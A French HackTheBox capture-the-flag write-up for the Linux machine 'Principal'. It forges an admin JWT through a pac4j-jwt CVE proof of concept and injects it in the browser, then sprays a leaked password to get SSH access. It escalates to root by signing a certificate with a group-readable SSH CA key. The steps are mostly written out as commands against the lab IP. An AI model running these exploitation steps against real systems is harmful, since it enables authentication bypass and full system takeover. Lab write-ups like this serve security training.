# Principal — HackTheBox Writeup
### OS: Linux
### Difficulty: Medium
### IP: 10.129.244.220

Reconnaissance
```nmap -sC -sV 10.129.244.220```
Ports ouverts :

22/tcp — SSH
8080/tcp — HTTP (Jetty, pac4j-jwt/6.0.3) - très direct on à un service et une version

google -> pac4j-jwt/6.0.3 CVE -> bingo on à une cve associée CVE-2026-29000 
google -> CVE-2026-29000 poc -> https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-Auth

git clone du PoC , analyse du code, on à besoin de récupérer le jwks public pour forger notre jwt malveillant et bypass l'auth.

Enumération Web (port 8080)
Le serveur redirige vers /login. En lisant le fichier JavaScript statique /static/js/app.js, on découvre l'architecture de l'application et ses endpoints :

POST /api/auth/login — authentification
GET /api/auth/jwks — clé publique RSA (JWK)
GET /api/dashboard / /api/users / /api/settings

Le commentaire dans le code révèle :

Les tokens sont des JWE chiffrés RSA-OAEP-256 + A128GCM
L'inner JWT est signé RS256
Rôles disponibles : ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
Foothold — JWT Forgery (JWE)
Le JWKS est accessible sans authentification :

```curl http://10.129.244.220:8080/api/auth/jwks```

On à l'url il n'y a plus qu'a la passer au PoC 

```python3 poc.py --jwks http://10.129.244.220:8080/api/auth/jwks``` 

on récupère notre jwt malveillant.

Token forgé injecté via la console du navigateur :

```sessionStorage.setItem('auth_token', '<JWE_TOKEN>');```
```window.location.href = '/dashboard';```
Accès admin obtenu.

Shell Initial — svc-deploy

En naviguant sur la webapp nous voyons un onglet settings dans lequel on voit un panel
security contenant un password : D3pl0y_$$H_Now42!

et un autre onglet users, nous tentons un password spraying avec les différents users
bingo svc-deploy fonctionne :

```ssh svc-deploy@10.129.244.220```
User flag : ```cat /home/svc-deploy/user.txt```

premier flag obtenu !

Privilege Escalation — SSH CA Key Abuse
Énumération avec LinPEAS. Findings critiques :

1. L'utilisateur svc-deploy est membre du groupe deployers :

uid=1001(svc-deploy) groups=1002(svc-deploy),1001(deployers)
2. La clé privée de la SSH CA est lisible par le groupe deployers :

-rw-r----- 1 root deployers 3381  /opt/principal/ssh/ca
3. Le serveur SSH trust cette CA (/etc/ssh/sshd_config.d/60-principal.conf) :

TrustedUserCAKeys /opt/principal/ssh/ca.pub
PermitRootLogin prohibit-password
PermitRootLogin prohibit-password autorise root par certificat (pas par mot de passe), ce qui valide le vecteur.

Exploitation
# Récupérer la clé CA
```cat /opt/principal/ssh/ca > /tmp/ca && chmod 600 /tmp/ca```

# Générer une paire de clés
```ssh-keygen -f /tmp/id_root -N ""```

# Signer un certificat pour root valable 1h
```ssh-keygen -s /tmp/ca -I root_cert -n root -V +1h /tmp/id_root.pub```

# Connexion root par certificat
```ssh -i /tmp/id_root -o CertificateFile=/tmp/id_root-cert.pub root@10.129.244.220```
Root flag : ```cat /root/root.txt```

# Lessons Learned
Les endpoints JS côté client exposent souvent l'architecture interne de l'API
Un JWKS public + tokens JWE mal validés = forgery possible
PermitRootLogin prohibit-password ≠ sécurisé si une CA privée est accessible à un groupe non-root
LinPEAS : toujours vérifier les fichiers root lisibles par groupe (Readable files belonging to root)